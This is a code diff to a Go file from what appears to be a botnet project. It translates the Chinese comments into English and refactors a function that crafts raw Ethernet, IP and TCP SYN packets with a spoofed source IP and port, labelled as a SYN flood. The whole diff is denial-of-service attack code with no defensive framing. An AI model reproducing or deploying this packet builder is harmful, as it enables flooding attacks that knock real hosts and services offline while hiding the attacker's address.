@@ -5,68 +5,66 @@ import (
 	"fmt"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
-	"bot/packetbuilder"
 )
 
-
-// SYN 泛洪
+// SYN Flood
 func SYNPacket(srcIP, dstIP string, srcPort, dstPort int) ([]byte, error) {
-	dstMacStr, err := packetbuilder.FindMAC(dstIP)
-    if err != nil {
-        return nil, fmt.Errorf("failed to find MAC for %s: %w", dstIP, err)
-    }
-    dstMac, err := net.ParseMAC(dstMacStr)
-    if err != nil {
-        return nil, fmt.Errorf("failed to parse MAC address: %w", err)
-    }
+	dstMacStr, err := FindMAC(dstIP)
+	if err != nil {
+		return nil, fmt.Errorf("failed to find MAC for %s: %w", dstIP, err)
+	}
+	dstMac, err := net.ParseMAC(dstMacStr)
+	if err != nil {
+		return nil, fmt.Errorf("failed to parse MAC address: %w", err)
+	}
 
-    srcMac, err := packetbuilder.GetSrcMAC(dstIP)
-    if err != nil {
-        return nil, fmt.Errorf("failed to get source MAC address: %w", err)
-    }
+	srcMac, err := GetSrcMAC(dstIP)
+	if err != nil {
+		return nil, fmt.Errorf("failed to get source MAC address: %w", err)
+	}
 
-    // 构造 Ethernet 层
-    ethLayer := &layers.Ethernet{
-        SrcMAC:       srcMac, // 源 MAC 地址
-        DstMAC:       dstMac, // 下一跳 MAC 地址
-        EthernetType: layers.EthernetTypeIPv4,
-    }
+	// Construct Ethernet layer
+	ethLayer := &layers.Ethernet{
+		SrcMAC:       srcMac, // Source MAC address
+		DstMAC:       dstMac, // Next-hop MAC address
+		EthernetType: layers.EthernetTypeIPv4,
+	}
 
-	// 构造 IP 层
+	// Construct IP layer
 	ipLayer := &layers.IPv4{
 		Version:  4,                       // IPv4
 		IHL:      5,                       // Internet Header Length
-		TOS:      0,                       // 服务类型
-		TTL:      64,                      // 生存时间
-		Protocol: layers.IPProtocolTCP,    // 设置为 TCP
-		SrcIP:    net.ParseIP(srcIP),      // 伪造的源 IP
-		DstIP:    net.ParseIP(dstIP),      // 目标 IP
+		TOS:      0,                       // Type of Service
+		TTL:      64,                      // Time to Live
+		Protocol: layers.IPProtocolTCP,    // Set to TCP
+		SrcIP:    net.ParseIP(srcIP),      // Spoofed source IP
+		DstIP:    net.ParseIP(dstIP),      // Destination IP
 	}
 
-	// 构造 TCP 层
+	// Construct TCP layer
 	tcpLayer := &layers.TCP{
-		SrcPort: layers.TCPPort(srcPort), // 伪造的源端口
-		DstPort: layers.TCPPort(dstPort), // 目标端口
-		Seq:     1105024978,             // 初始序列号（可以随机生成）
-		SYN:     true,                   // 设置 SYN 标志位
-		Window:  14600,                  // 窗口大小
+		SrcPort: layers.TCPPort(srcPort), // Spoofed source port
+		DstPort: layers.TCPPort(dstPort), // Destination port
+		Seq:     1105024978,             // Initial sequence number (can be randomly generated)
+		SYN:     true,                   // Set SYN flag
+		Window:  14600,                  // Window size
 	}
 
-	// 设置网络层以计算校验和
+	// Set network layer for checksum calculation
 	if err := tcpLayer.SetNetworkLayerForChecksum(ipLayer); err != nil {
-		return nil, fmt.Errorf("TCP 校验和计算失败: %v", err)
+		return nil, fmt.Errorf("failed to calculate TCP checksum: %v", err)
 	}
 
-	// 创建序列化选项，用于设置长度和校验和
+	// Create serialization options to set lengths and checksums
 	options := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
 	buffer := gopacket.NewSerializeBuffer()
 
-	// 序列化以太网层、IP 层、TCP 层
+	// Serialize Ethernet, IP, and TCP layers
 	err = gopacket.SerializeLayers(buffer, options, ethLayer, ipLayer, tcpLayer)
 	if err != nil {
-		return nil, fmt.Errorf("序列化层失败: %v", err)
+		return nil, fmt.Errorf("failed to serialize layers: %v", err)
 	}
 
-	// 返回生成的报文字节切片
+	// Return the generated packet as a byte slice
 	return buffer.Bytes(), nil
 }
